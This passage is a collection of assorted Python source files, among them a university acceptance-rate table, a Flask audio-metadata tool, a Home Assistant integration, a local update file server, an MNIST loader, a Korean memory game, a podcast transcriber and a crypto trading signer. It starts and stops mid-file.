21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1]\nbaseList2 = [25, 24.5, 24, 23.5, 23, 22.5, 22, 21.5, 21, 20.5, 20, 19.5, 19, 18.5, 18, 17.5, 17, 16.5, 16, 15.5, 15, 14.5, 14, 13.5, 13, 12.5, 12, 11.5, 11, 10.5, 10, 9.5, 9, 8.5, 8, 7.5, 7, 6.5, 6, 5.5, 5, 4.5, 4, 3.5, 3, 2.5, 2, 1.5, 1]\n\nstl = ''\natl = \"\"\n\naRateDict = {'University Of Pennsylvania': 6,\n'Harvard University': 4,\n'Northwestern University': 7,\n'Johns Hopkins University': 8,\n'Georgetown University': 12,\n'Duke University': 6,\n'Massachusetts Institute Of Technology': 4,\n'Cornell University': 9,\n'Stanford University': 4,\n'New York University': 13,\n'Dartmouth College': 6,\n'Carnegie Mellon University': 14,\n'Columbia University In The City Of New York': 4,\n'University Of California Berkeley': 14,\n'University Of Chicago': 6,\n'Yale University': 5,\n'Vanderbilt University': 7,\n'University Of Southern California': 13,\n'Boston College': 19,\n'Pepperdine University': 53,\n'University Of Michigan Ann Arbor': 20,\n'The University Of Texas At Austin': 29,\n'Georgia Institute Of Technology Main Campus': 16,\n'University Of Virginia Main Campus': 21,\n'Villanova University': 25,\n'University Of Oklahoma Norman Campus': 85,\n'Brown University': 6,\n\"Saint Mary'S College Of California\": 70,\n'University Of Notre Dame': 15,\n'Washington University In St Louis': 13,\n'George Mason University': 91,\n'Arizona State University Tempe': 88,\n'Thomas Aquinas College': 83,\n'University Of North Carolina At Chapel Hill': 20,\n'Drexel University': 83,\n'University Of South Florida Main Campus': 49,\n'University Of Iowa': 86,\n'California Institute Of Technology': 4,\n'Harvey Mudd College': 10,\n'Southern Methodist University': 53,\n'California State University Sacramento': 94,\n'Butler University': 81,\n'University Of California Los Angeles': 11,\n'North Carolina State University': 47,\n'Boston University': 19,\n'Claremont Mckenna College': 11,\n'University Of Georgia': 40,\n'Suny At Binghamton': 44,\n'Angelo State University': 70,\n'University Of Wisconsin Green Bay': 91,\n'Virginia Tech': 56,\n'University Of Washington Seattle Campus': 53,\n'College Of William And Mary': 37,\n'The New School': 66,\n'George Washington University': 50,\n'Purdue University Main Campus': 69,\n'Valencia College': 8,\n\"Auburn University\": 70,\n'Tulane University': 10,\n'Princeton University': 4,\n'Pennsylvania State University Main Campus': 55,\n    \"University Of California San Diego\": 23.7,\n    \"University Of Illinois At Urbana Champaign\": 60.1,\n    \"University Of Florida\": 29.4,\n    \"Michigan State University\": 76.0,\n    \"Indiana University Bloomington\": 77.0,\n    \"University Of Arizona\": 87.0,\n    \"Ohio State University Main Campus\": 57.8,\n    \"Texas A&M University College Station\": 63.0,\n    \"University Of Minnesota Twin Cities\": 70.6,\n    \"University Of Maryland College Park\": 52.0,\n    \"Rutgers University New Brunswick\": 67.0,\n    \"University Of Pittsburgh\": 64.0,\n    \"University Of Colorado Boulder\": 80.0,\n    \"University Of Wisconsin Madison\": 60.0,\n    \"University Of Massachusetts Amherst\": 65.0,\n    \"University Of Utah\": 83.1,\n    \"University Of Connecticut\": 56.1,\n    \"University Of Alabama\": 85.0,\n    \"University Of Kentucky\": 95.0,\n    \"University Of Nevada Reno\": 88.2,\n    \"University Of Missouri Columbia\": 78.9,\n    \"University Of Oregon\": 84.0,\n    \"Oregon State University\": 82.0,\n    \"University Of South Carolina\": 64.2,\n    \"The University Of Tennessee\": 75.0,\n    \"University Of Mississippi\": 88.0,\n    \"University Of Kansas\": 91.0,\n    \"University Of Nebraska Lincoln\": 81.0,\n    \"University Of Hawaii Manoa\": 84.0,\n    \"University Of Idaho\": 74.0,\n    \"Colorado State University\": 90.5,\n    \"University Of Vermont\": 67.3,\n    \"San Diego State University\": 40.0,\n    \"California State University Long Beach\": 47.0,\n    \"California Polytechnic State University San Luis Obispo\": 30.0,\n",
    "from flask import Flask, request, jsonify, send_file\nimport requests\nimport logging\nfrom mutagen.mp4 import MP4, MP4Cover\nfrom pathlib import Path\nfrom flask_cors import CORS\nfrom PIL import Image\nimport io\n\napp = Flask(__name__)\nCORS(app)\n\n# Set up logging\nlogging.basicConfig(level=logging.DEBUG)\nlogger = logging.getLogger(__name__)\n\n@app.route('/generate-audio', methods=['GET'])\ndef download_song():\n    try:\n        # Get the song details from the query parameters\n        audio_url = request.args.get('audioUrl')\n        image_url = request.args.get('imageUrl')\n        song_name = request.args.get('songName', 'Unknown')\n        artist = request.args.get('artist', 'Unknown')\n        album = request.args.get('album', 'Unknown')\n        year = request.args.get('year', 'Unknown')\n        \n        if not audio_url:\n            return jsonify({\"error\": \"Audio URL is required\"}), 400\n        \n        logger.info(f\"Downloading song: {song_name} by {artist}\")\n\n        # Validate and fetch the image\n        image_content = None\n        if image_url:\n            try:\n                image_response = requests.get(image_url, timeout=10)\n                image_response.raise_for_status()\n\n                # Check if the image can be opened\n                image_bytes = io.BytesIO(image_response.content)\n                with Image.open(image_bytes) as img:\n                    if img.format == \"WEBP\":\n                        img = img.convert(\"RGB\")\n                        converted_image = io.BytesIO()\n                        img.save(converted_image, format=\"JPEG\")\n                        converted_image.seek(0)\n                        image_content = converted_image.read()\n                    else:\n                        image_content = image_response.content\n            except Exception as e:\n                logger.error(f\"Invalid image URL or failed to fetch image: {e}\")\n                return jsonify({\"error\": \"Invalid or inaccessible image URL\"}), 400\n\n        # Create file path using pathlib for cross-platform compatibility\n        tmp_dir = Path('/tmp')\n        if not tmp_dir.exists():\n            tmp_dir.mkdir(parents=True, exist_ok=True)\n            \n        song_id = song_name.replace(\" \", \"_\")  # Use song name as ID for file naming\n        file_path = tmp_dir / f\"song_{song_id}.m4a\"\n        logger.info(f\"Temporary file path: {file_path}\")\n\n        # Fetch and save the audio file\n        audio_response = requests.get(audio_url, stream=True)\n        audio_response.raise_for_status()\n\n        # Write the file\n        with open(file_path, 'wb') as f:\n            for chunk in audio_response.iter_content(chunk_size=8192):\n                f.write(chunk)\n\n        # Add metadata with cover art\n        def add_metadata_with_cover(file_path, image_content):\n            \"\"\"Add metadata including cover art to the M4A file.\"\"\"\n            try:\n                audio = MP4(file_path)\n\n                # Add metadata\n                audio.tags['\\xa9nam'] = [song_name]\n                audio.tags['\\xa9ART'] = [artist]\n                audio.tags['\\xa9alb'] = [album]\n                audio.tags['\\xa9day'] = [year]\n\n                # Add cover art\n                if image_content:\n                    cover_data = MP4Cover(image_content, MP4Cover.FORMAT_JPEG)\n                    audio.tags['covr'] = [cover_data]\n\n                audio.save()\n                logger.info(f\"Metadata added to {file_path}\")\n                return True\n\n            except Exception as e:\n                logger.error(f\"Error adding metadata: {e}\")\n                return False\n\n        if not add_metadata_with_cover(str(file_path), image_content):\n            logger.warning(\"Failed to add metadata to the file\")\n\n        try:\n            # Send the file as response\n            return send_file(\n                str(file_path),\n                as_attachment=True,\n                download_name=f\"{song_name}.m4a\",\n                mimetype=\"audio/mp4\"\n            )\n        finally:\n            # Clean up the file after sending\n            try:\n                if file_path.exists():\n                    file_path.unlink()\n                    logger.info(f\"Temporary file {file_path} deleted successfully.\")\n            except Exception as e:\n                logger.error(f\"Error removing temporary file: {e}\")\n\n    except requests.exceptions.RequestException as e:\n        logger.error(f\"API request error: {e}\")\n        return jsonify({\"error\": \"Failed to fetch data from the provided URL\"}), 500\n    except Exception as e:\n        logger.error(f\"Unexpected error: {e}\")\n        return jsonify({\"error\": str(e)}), 500\n\n@app.route(\"/\", methods=['GET'])\ndef index():\n    return '''<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>THE ULTIMATE MP3 Metadata Embedder</title>\n    <link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap\" rel=\"stylesheet\">",
    "import logging\nfrom homeassistant.config_entries import ConfigEntry\nfrom homeassistant.core import HomeAssistant\nfrom homeassistant.helpers import config_validation as cv\nfrom homeassistant.helpers.typing import ConfigType\n\nfrom .const import DOMAIN\nfrom .coordinator import HidroelectricaCoordinator\n\n_LOGGER = logging.getLogger(__name__)\n\nCONFIG_SCHEMA = cv.config_entry_only_config_schema(DOMAIN)\n\nasync def async_setup(hass: HomeAssistant, config: ConfigType) -> bool:\n    _LOGGER.debug(\"Execut\u0103m async_setup pentru Hidroelectrica: nimic special de f\u0103cut aici.\")\n    return True\n\n\nasync def async_setup_entry(hass: HomeAssistant, entry: ConfigEntry) -> bool:\n    _LOGGER.debug(\"Ini\u021biem integrarea Hidroelectrica pentru entry: %s\", entry.title)\n\n    # Asigur\u0103m un dict global\n    if DOMAIN not in hass.data:\n        hass.data[DOMAIN] = {}\n\n    # 1. Cre\u0103m coordinator\n    coordinator = HidroelectricaCoordinator(hass, entry)\n\n    # 2. Salv\u0103m coordinatorul\n    hass.data[DOMAIN][entry.entry_id] = {\n        \"coordinator\": coordinator\n    }\n\n    # 3. Facem primul refresh (blocant p\u00e2n\u0103 c\u00e2nd datele se ob\u021bin sau apare eroare)\n    await coordinator.async_config_entry_first_refresh()\n\n    # 4. Forward la platforma sensor\n    await hass.config_entries.async_forward_entry_setups(entry, [\"sensor\"])\n\n    _LOGGER.debug(\"Hidroelectrica - Setup entry finalizat cu succes.\")\n    return True\n\n\nasync def async_unload_entry(hass: HomeAssistant, entry: ConfigEntry) -> bool:\n    _LOGGER.debug(\"Desc\u0103rc\u0103m entry-ul Hidroelectrica pentru entry_id: %s\", entry.entry_id)\n    unload_ok = await hass.config_entries.async_unload_platforms(entry, [\"sensor\"])\n    if unload_ok:\n        hass.data[DOMAIN].pop(entry.entry_id, None)\n    return unload_ok\n",
    "from http.server import HTTPServer, BaseHTTPRequestHandler\nimport os\nimport json\nimport logging\nfrom datetime import datetime\n\n# Configure logging\nlogging.basicConfig(\n    level=logging.INFO,\n    format='%(asctime)s - %(levelname)s - %(message)s',\n    handlers=[\n        logging.FileHandler('update_server.log'),\n        logging.StreamHandler()\n    ]\n)\n\nclass UpdateServer(BaseHTTPRequestHandler):\n    BASE_DIR = os.path.dirname(os.path.abspath(__file__))\n    BOOTSTRAP_DIR = os.path.join(BASE_DIR, 'bootstrap')\n    CONTENT_DIR = os.path.join(BASE_DIR, 'content')\n    CONTENT_TYPES = {\n        '.txt': 'text/plain',\n        '.xml': 'application/xml',\n        '.xz': 'application/x-xz',\n        '.exe': 'application/x-msdownload'\n    }\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n\n    def get_file_path(self, requested_path):\n        \"\"\"Determine the correct file path based on the request.\"\"\"\n        clean_path = requested_path.lstrip('/')\n        if clean_path.startswith('bootstrap/'):\n            return os.path.join(self.BASE_DIR, clean_path)\n        elif clean_path.startswith('content/'):\n            return os.path.join(self.BASE_DIR, clean_path)\n        return os.path.join(self.BOOTSTRAP_DIR, clean_path)\n\n    def is_valid_path(self, file_path):\n        \"\"\"Check if the file path is within allowed directories.\"\"\"\n        abs_path = os.path.abspath(file_path)\n        return abs_path.startswith(os.path.abspath(self.BOOTSTRAP_DIR)) or \\\n               abs_path.startswith(os.path.abspath(self.CONTENT_DIR))\n\n    def get_content_type(self, file_path):\n        \"\"\"Determine the content type based on the file extension.\"\"\"\n        _, ext = os.path.splitext(file_path)\n        return self.CONTENT_TYPES.get(ext, 'application/octet-stream')\n\n    def do_GET(self):\n        \"\"\"Handle GET requests.\"\"\"\n        try:\n            file_path = self.get_file_path(self.path)\n            logging.info(f\"Checking for file: {file_path}\")\n\n            if not self.is_valid_path(file_path):\n                self.send_error(403, \"Forbidden\")\n                logging.warning(f\"Attempted directory traversal: {file_path}\")\n                return\n\n            if not os.path.exists(file_path):\n                self.send_error(404, f\"File not found: {self.path}\")\n                return\n\n            file_stats = os.stat(file_path)\n            file_size = file_stats.st_size\n            last_modified = datetime.fromtimestamp(file_stats.st_mtime).strftime('%a, %d %b %Y %H:%M:%S GMT')\n            content_type = self.get_content_type(file_path)\n\n            self.send_response(200)\n            self.send_header('Content-Type', content_type)\n            self.send_header('Content-Length', file_size)\n            self.send_header('Last-Modified', last_modified)\n            self.end_headers()\n\n            logging.info(f\"Serving {self.path} ({file_size} bytes)\")\n\n            with open(file_path, 'rb') as f:\n                self.wfile.write(f.read())\n\n        except Exception as e:\n            logging.error(f\"Error serving {self.path}: {str(e)}\")\n            self.send_error(500, f\"Internal server error: {str(e)}\")\n\n    def log_message(self, format, *args):\n        \"\"\"Override to use our logging configuration.\"\"\"\n        logging.info(format % args)\n\ndef list_directory_files(base_dir, directory, prefix=''):\n    \"\"\"Recursively list all files in a directory with their sizes.\"\"\"\n    files = []\n    try:\n        for root, _, filenames in os.walk(directory):\n            rel_path = os.path.relpath(root, base_dir)\n            current_prefix = f\"{prefix}{rel_path}/\" if rel_path != '.' else prefix\n            for filename in filenames:\n                file_path = os.path.join(root, filename)\n                size = os.path.getsize(file_path)\n                files.append(f\" - {current_prefix}{filename} ({size:,} bytes)\")\n    except Exception as e:\n        logging.error(f\"Error listing directory {directory}: {str(e)}\")\n    return sorted(files)\n\ndef run_server(host='0.0.0.0', port=80):\n    \"\"\"Run the update server.\"\"\"\n    try:\n        server = HTTPServer((host, port), UpdateServer)\n        print(f\"Starting update server on {host}:{port}\")\n\n        base_dir = os.path.dirname(os.path.abspath(__file__))\n\n        bootstrap_path = os.path.join(base_dir, 'bootstrap')\n        print(f\"\\nServing bootstrap files from {bootstrap_path}:\")\n        for file_info in list_directory_files(base_dir, bootstrap_path, 'bootstrap/'):\n            print(file_info)\n\n        content_path = os.path.join(base_dir, 'content')\n        print(f\"\\nServing content files from {content_path}:\")\n        for file_info in list_directory_files(base_dir, content_path, 'content/'):\n            print(file_info)\n\n        print(\"\\nServer is ready to handle requests...\")\n        server.serve_forever()\n    except Exception as e:\n        logging.error(f\"Server error: {str(e)}\")\n        if \"Permission denied\" in str(e):\n            print(\"\\nError: Permission denied. Try running with administrator p",
    "import loguru\n\nfrom quantalogic.model_info_list import model_info\nfrom quantalogic.model_info_litellm import litellm_get_model_max_input_tokens, litellm_get_model_max_output_tokens\nfrom quantalogic.utils.lm_studio_model_info import ModelInfo, get_model_list\n\nDEFAULT_MAX_OUTPUT_TOKENS = 4 * 1024  # Reasonable default for most models\nDEFAULT_MAX_INPUT_TOKENS = 32 * 1024  # Reasonable default for most models\n\n\ndef validate_model_name(model_name: str) -> None:\n    if not isinstance(model_name, str) or not model_name.strip():\n        raise ValueError(f\"Invalid model name: {model_name}\")\n\n\ndef print_model_info():\n    for info in model_info.values():\n        print(f\"\\n{info.model_name}:\")\n        print(f\"  Max Input Tokens: {info.max_input_tokens:,}\")\n        print(f\"  Max Output Tokens: {info.max_output_tokens:,}\")\n\n\ndef get_max_output_tokens(model_name: str) -> int:\n    \"\"\"Get max output tokens with safe fallback\"\"\"\n    validate_model_name(model_name)\n\n    if model_name.startswith('lm_studio/'):\n        try:\n            models = get_model_list()\n            for model in models.data:\n                if model.id == model_name[len('lm_studio/'):]:\n                    return model.max_context_length\n        except Exception:\n            loguru.logger.warning(f\"Could not fetch LM Studio model info for {model_name}, using default\")\n\n    if model_name in model_info:\n        return model_info[model_name].max_output_tokens\n\n    try:\n        return litellm_get_model_max_output_tokens(model_name)\n    except Exception as e:\n        loguru.logger.warning(f\"Model {model_name} not found in LiteLLM registry, using default\")\n        return DEFAULT_MAX_OUTPUT_TOKENS\n\n\ndef get_max_input_tokens(model_name: str) -> int:\n    \"\"\"Get max input tokens with safe fallback\"\"\"\n    validate_model_name(model_name)\n\n    if model_name.startswith('lm_studio/'):\n        try:\n            models = get_model_list()\n            for model in models.data:\n                if model.id == model_name[len('lm_studio/'):]:\n                    return model.max_context_length\n        except Exception:\n            loguru.logger.warning(f\"Could not fetch LM Studio model info for {model_name}, using default\")\n\n    if model_name in model_info:\n        return model_info[model_name].max_input_tokens\n\n    try:\n        return litellm_get_model_max_input_tokens(model_name)\n    except Exception:\n        loguru.logger.warning(f\"Model {model_name} not found in LiteLLM registry, using default\")\n        return DEFAULT_MAX_INPUT_TOKENS\n\n\ndef get_max_tokens(model_name: str) -> int:\n    \"\"\"Get total maximum tokens (input + output)\"\"\"\n    validate_model_name(model_name)\n\n    # Get input and output tokens separately\n    input_tokens = get_max_input_tokens(model_name)\n    output_tokens = get_max_output_tokens(model_name)\n\n    return input_tokens + output_tokens\n\n\nif __name__ == \"__main__\":\n    print_model_info()\n    print(get_max_input_tokens(\"gpt-4o-mini\"))\n    print(get_max_output_tokens(\"openrouter/openai/gpt-4o-mini\"))\n",
    "# main.py\n\nimport uuid\nimport logging\n\nfrom logging_config import setup_logging\nfrom audio_text_processor import AudioTextProcessor\nfrom config import (\n    DEFAULT_API_URL,\n    DEFAULT_AUTHORIZATION,\n    DEFAULT_LANGUAGE,\n    DEFAULT_TTS_VOICE,\n    DEFAULT_USE_VOICE,\n    DEFAULT_OUTPUT_DIR\n)\n\ndef main():\n    \"\"\"\n    Main function to execute the AudioTextProcessor.\n    \"\"\"\n    # Setup logging\n    setup_logging()\n\n    # Define your messages and parameters here\n    user_message = \"What was the last question I asked you? Also tell me what is your knowledge cut off.\"\n    assistant_message = \"Hello! I'm here with you.\"\n    tts_voice = \"nova\"  \n    language = \"en\"       \n    use_voice = True\n    play_audio_flag = True \n\n    # Initialize the processor with appropriate configurations\n    processor = AudioTextProcessor(\n        app_id=f'anonymous_{uuid.uuid4().hex}',\n        language=language,\n        tts_voice=tts_voice,\n        use_voice=use_voice,\n        api_url=DEFAULT_API_URL,\n        authorization=DEFAULT_AUTHORIZATION,\n        output_dir=DEFAULT_OUTPUT_DIR\n    )\n\n    # Generate audio and text based on the messages\n    response = processor.generate(\n        user_message=user_message,\n        assistant_message=assistant_message,\n        play_audio=play_audio_flag\n    )\n\n    if response:\n        logging.info(\"Processing completed successfully.\")\n    else:\n        logging.error(\"Processing failed.\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import numpy as np\nimport struct\n\nclass MNISTLoader:\n    def __init__(self, images_path, labels_path):\n\n        # Load images\n        with open(images_path, 'rb') as f:\n            magic, num_images, rows, cols = struct.unpack('>IIII', f.read(16))\n            images = np.frombuffer(f.read(), dtype=np.uint8)\n            self.images = images.reshape(num_images, 1, rows, cols).astype(np.float32) / 255.0\n        \n        # Load labels\n        with open(labels_path, 'rb') as f:\n            magic, num_labels = struct.unpack('>II', f.read(8))\n            self.labels = np.frombuffer(f.read(), dtype=np.uint8)\n        \n        # One-hot encode labels\n        self.one_hot_labels = self.to_one_hot(self.labels)\n    \n    def to_one_hot(self, labels, num_classes=10):\n\n        one_hot = np.zeros((labels.size, num_classes))\n        one_hot[np.arange(labels.size), labels] = 1\n        return one_hot\n    \n\n    def get_batches(self, batch_size, shuffle=True):\n\n        # Create indices\n        indices = np.arange(len(self.images))\n        \n        # Shuffle if specified\n        if shuffle:\n            np.random.shuffle(indices)\n        \n        # Generate batches\n        for start_idx in range(0, len(indices), batch_size):\n            batch_indices = indices[start_idx:start_idx + batch_size]\n            \n            yield (\n                self.images[batch_indices],\n                self.one_hot_labels[batch_indices]\n            )\n\n    def __len__(self):\n        return len(self.images)",
    "from tkinter import *\nimport random\nimport time\nt=Tk()\nt.geometry(\"480x480\")\nt.title(\"\uba54\ubaa8\ub9ac \uac8c\uc784!\")\nt.resizable(0,0)\nrandomlist=[]\nbuttonlist=[\"bu1\",\"bu2\",\"bu3\",\"bu4\"]\nrlist=[]\nanswerlist=[]\nwaittime=1000\nisnotrunning=True\niswaiting=False\nprevlen=0\ndef empty():\n    pass\ndef reset():\n    global randomlist, buttonlist, rlist, answerlist, waittime, isnotrunning, iswaiting, prevlen\n    randomlist=[]\n    buttonlist=[\"bu1\",\"bu2\",\"bu3\",\"bu4\"]\n    rlist=[]\n    answerlist=[]\n    waittime=1000\n    isnotrunning=True\n    iswaiting=False\n    prevlen=0\n    informla.configure(text=\"\uc2dc\uc791 \ubc84\ud2bc\uc744 \ub20c\ub7ec\uc8fc\uc138\uc694!\", font=\"\ub9d1\uc740\uace0\ub515 30\")\n    bu1.configure(command=empty)\n    bu2.configure(command=empty)\n    bu3.configure(command=empty)\n    bu4.configure(command=empty)\n    startbu.configure(command=a)\ndef randompick():\n    randomlist=[]\n    for i in range(4):\n        randomlist.append(buttonlist[random.randint(0,3)])\n    return randomlist\ndef a():\n    global rlist, isnotrunning\n    if isnotrunning:\n        isnotrunning=False\n        rlist=randompick()\n        informla.configure(text=\"\uae30\uc5b5\ud574\uc8fc\uc138\uc694!\")\n        eval(rlist[0]).configure(text=\"\u2460\")\n        t.after(waittime,b)\ndef b():\n    eval(rlist[0]).configure(text=\"\")\n    eval(rlist[1]).configure(text=\"\u2461\")\n    t.after(waittime,c)\ndef c():\n    eval(rlist[1]).configure(text=\"\")\n    eval(rlist[2]).configure(text=\"\u2462\")\n    t.after(waittime,d)\ndef d():\n    eval(rlist[2]).configure(text=\"\")\n    eval(rlist[3]).configure(text=\"\u2463\")\n    t.after(waittime,e)\ndef e():\n    global isnotrunning, iswaiting\n    eval(rlist[3]).configure(text=\"\")\n    isnotrunning=True\n    iswaiting=True\n    answer()\ndef one():\n    global answerlist\n    answerlist.append(\"bu1\")\n    bu1.configure(text=\"\u2714\")\n    bu2.configure(text=\"\")\n    bu3.configure(text=\"\")\n    bu4.configure(text=\"\")\ndef two():\n    global answerlist\n    answerlist.append(\"bu2\")\n    bu1.configure(text=\"\")\n    bu2.configure(text=\"\u2714\")\n    bu3.configure(text=\"\")\n    bu4.configure(text=\"\")\ndef three():\n    global answerlist\n    answerlist.append(\"bu3\")\n    bu1.configure(text=\"\")\n    bu2.configure(text=\"\")\n    bu3.configure(text=\"\u2714\")\n    bu4.configure(text=\"\")\ndef four():\n    global answerlist\n    answerlist.append(\"bu4\")\n    bu1.configure(text=\"\")\n    bu2.configure(text=\"\")\n    bu3.configure(text=\"\")\n    bu4.configure(text=\"\u2714\")\ndef checkanswer():\n    global answerlist\n    global iswaiting\n    global prevlen\n    if iswaiting:\n        if len(answerlist)==4:\n            bu1.configure(text=\"\")\n            bu2.configure(text=\"\")\n            bu3.configure(text=\"\")\n            bu4.configure(text=\"\")\n            bu1.configure(command=empty)\n            bu2.configure(command=empty)\n            bu3.configure(command=empty)\n            bu4.configure(command=empty)\n            informla.configure(text=\"\ucd95\ud558\ud569\ub2c8\ub2e4!\\n3\ucd08 \ud6c4 \uc7ac\uc2dc\uc791...\")\n            iswaiting=False\n            t.after(3000, reset)\n            return None\n        elif prevlen<len(answerlist):\n            if answerlist[prevlen] in rlist[prevlen]:\n                prevlen+=1\n            else:\n                informla.configure(text=\"\ub561! 3\ucd08 \ud6c4 \uc7ac\uc2dc\uc791...\")\n                bu1.configure(command=empty)\n                bu2.configure(command=empty)\n                bu3.configure(command=empty)\n                bu4.configure(command=empty)\n                bu1.configure(text=\"\")\n                bu2.configure(text=\"\")\n                bu3.configure(text=\"\")\n                bu4.configure(text=\"\")\n                iswaiting=False\n                t.after(3000, reset)\n                return None\n        t.after(1, checkanswer)\ndef answer():\n    global iswaiting\n    informla.configure(text=\"\uc54c\ub9de\ub294 \ubc84\ud2bc\uc744\\n\uc21c\uc11c\ub300\ub85c \ub20c\ub7ec\uc8fc\uc138\uc694!\",font=\"\ub9d1\uc740\uace0\ub515 30\")\n    bu1.configure(command=one)\n    bu2.configure(command=two)\n    bu3.configure(command=three)\n    bu4.configure(command=four)\n    startbu.configure(command=empty)\n    checkanswer()\nbu1=Button(t, text=\"\", font=\"\ub9d1\uc740\uace0\ub515 20\", width=15,height=5)\nbu1.grid(row=1,column=1)\nbu2=Button(t, text=\"\", font=\"\ub9d1\uc740\uace0\ub515 20\", width=15,height=5)\nbu2.grid(row=1,column=2)\nbu3=Button(t, text=\"\", font=\"\ub9d1\uc740\uace0\ub515 20\", width=15,height=5)\nbu3.grid(row=2,column=1)\nbu4=Button(t, text=\"\", font=\"\ub9d1\uc740\uace0\ub515 20\", width=15,height=5)\nbu4.grid(row=2,column=2)\nstartbu=Button(t, text=\"\uc2dc\uc791\", font=\"\ub9d1\uc740\uace0\ub515 20\",command=a)\nstartbu.place(x=210,y=315)\ninformla=Label(t, text=\"\uc2dc\uc791 \ubc84\ud2bc\uc744 \ub20c\ub7ec\uc8fc\uc138\uc694!\",font=\"\ub9d1\uc740\uace0\ub515 30\")\ninformla.place(x=10, y=400)\nt.mainloop()",
    "#!/usr/bin/python3\n\nimport os\nimport json\nimport requests\nfrom pydub import AudioSegment\nfrom openai import OpenAI\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\n# Directories for downloads and transcripts\nEPISODE_DIR = \"episodes\"\nTRANSCRIPT_DIR = \"transcripts\"\nRESULTS_DIR = \"results\"\nDETAILED_EPISODES_FILE = f\"{RESULTS_DIR}/detailed_episodes.json\"\nOPENAI_API_KEY = os.getenv(\"OPENAI_API_KEY\")\n\ndef ensure_directories():\n    os.makedirs(EPISODE_DIR, exist_ok=True)\n    os.makedirs(TRANSCRIPT_DIR, exist_ok=True)\n    os.makedirs(RESULTS_DIR, exist_ok=True)\n\ndef load_episodes(filename=\"detailed_episodes.json\"):\n    with open(filename, \"r\", encoding=\"utf-8\") as file:\n        return json.load(file)\n\ndef save_episodes(data, filename=\"detailed_episodes.json\"):\n    with open(filename, \"w\", encoding=\"utf-8\") as file:\n        json.dump(data, file, ensure_ascii=False, indent=4)\n\ndef download_episode(url, episode_id):\n    local_path = os.path.join(EPISODE_DIR, f\"{episode_id}.mp3\")\n    if os.path.exists(local_path):\n        print(f\"Episode {episode_id} already downloaded.\")\n        return local_path\n\n    print(f\"Downloading episode {episode_id}...\")\n    response = requests.get(url, stream=True)\n    response.raise_for_status()\n\n    with open(local_path, \"wb\") as file:\n        for chunk in response.iter_content(chunk_size=8192):\n            file.write(chunk)\n\n    print(f\"Episode {episode_id} downloaded to {local_path}.\")\n    return local_path\n\ndef split_audio(file_path):\n    audio = AudioSegment.from_file(file_path)\n    chunks = []\n    max_chunk_size = 20 * 60 * 1000  # 20 minutes in milliseconds\n\n    for i in range(0, len(audio), max_chunk_size):\n        chunks.append(audio[i:i + max_chunk_size])\n\n    return chunks\n\ndef transcribe_chunk(chunk, chunk_id):\n    client = OpenAI(api_key=OPENAI_API_KEY)\n    chunk.export(f\"{chunk_id}.mp3\", format=\"mp3\")\n    with open(f\"{chunk_id}.mp3\", \"rb\") as audio_file:\n        response = client.audio.transcriptions.create(\n            model=\"whisper-1\",\n            file=audio_file,\n            response_format=\"text\"\n        )\n    os.remove(f\"{chunk_id}.mp3\")\n    return response\n\ndef transcribe_episode(file_path, episode_id):\n    transcript_path = os.path.join(TRANSCRIPT_DIR, f\"{episode_id}.txt\")\n    if os.path.exists(transcript_path):\n        print(f\"Transcript for episode {episode_id} already exists.\")\n        return transcript_path\n\n    print(f\"Transcribing episode {episode_id}...\")\n    chunks = split_audio(file_path)\n    transcripts = [transcribe_chunk(chunk, f\"{episode_id}_chunk_{i}\") for i, chunk in enumerate(chunks)]\n    full_transcript = \"\\n\".join(transcripts)\n\n    with open(transcript_path, \"w\", encoding=\"utf-8\") as file:\n        file.write(full_transcript)\n\n    print(f\"Transcript for episode {episode_id} saved to {transcript_path}.\")\n    return transcript_path\n\ndef process_episodes(filename=DETAILED_EPISODES_FILE):\n    \"\"\"\n    Processes episodes: transcribes and updates the JSON file if no transcript exists.\n    Downloads audio only if a transcript does not already exist.\n    \"\"\"\n    ensure_directories()\n    #model = WhisperModel(WHISPER_MODEL, device=\"cpu\")  # Adjust model and device as needed\n\n    episodes = load_episodes(filename)\n    for episode in episodes:\n        episode_id = episode['episode_id'].replace(\"/\",\"_\")\n        transcript_path = os.path.join(TRANSCRIPT_DIR, f\"{episode_id}.txt\")\n\n        if os.path.exists(transcript_path):\n            print(f\"Transcript for episode {episode_id} already exists. Skipping download.\")\n            continue\n        \n        episode_file = download_episode(episode[\"episode_url\"], episode_id)\n        transcript_file = transcribe_episode(episode_file, episode_id)\n        episode[\"transcript_file\"] = transcript_file\n    \n    save_episodes(episodes, filename)\n\nif __name__ == \"__main__\":\n    process_episodes()\n\n",
    "from decimal import Decimal\nfrom eth_account.messages import encode_defunct\nfrom web3 import Web3\nimport requests\n\nfrom lyra_v2_action_signing import SignedAction, TradeModuleData, utils\nfrom utils.misc import create_timestamp_signature\n\n\nDOMAIN_SEPARATOR = \"0xd96e5f90797da7ec8dc4e276260c7f3f87fedf68775fbe1ef116e996fc60441b\"\nACTION_TYPEHASH = \"0x4d7a9f27c403ff9c0f19bce61d76d82f9aa29f8d6d4b0c5474607d9770d1af17\"\nTRADE_MODULE_ADDRESS = \"0xB8D20c2B7a1Ad2EE33Bc50eF10876eD3035b5e7b\"\nORDER_ENDPOINT = \"https://api.lyra.finance/private/order\"\nTICKER_ENDPOINT = \"https://api.lyra.finance/public/get_ticker\"\n\n\ndef get_instrument_ticker(token):\n    response = requests.post(\n        TICKER_ENDPOINT,\n        json= { \"instrument_name\": f\"{token.upper()}-PERP\" },\n        headers={\n            \"accept\": \"application/json\",\n            \"content-type\": \"application/json\"\n        }\n        # proxies=proxy\n    )\n    return response.json()[\"result\"]\n\n\ndef generate_signature(wallet, timestamp):\n    lyra_message = encode_defunct(text=timestamp)\n    return wallet.sign_message(lyra_message).signature.hex()\n\n\ndef create_action(wallet_data, eoa_wallet, instrument_ticker, amount, limit_price, is_bid):\n    return SignedAction(\n        subaccount_id=wallet_data['subacc_id'],\n        owner=wallet_data['derive_wallet'],\n        signer=eoa_wallet.address,\n        signature_expiry_sec=utils.MAX_INT_32,\n        nonce=utils.get_action_nonce(),\n        module_address=TRADE_MODULE_ADDRESS,\n        module_data=TradeModuleData(\n            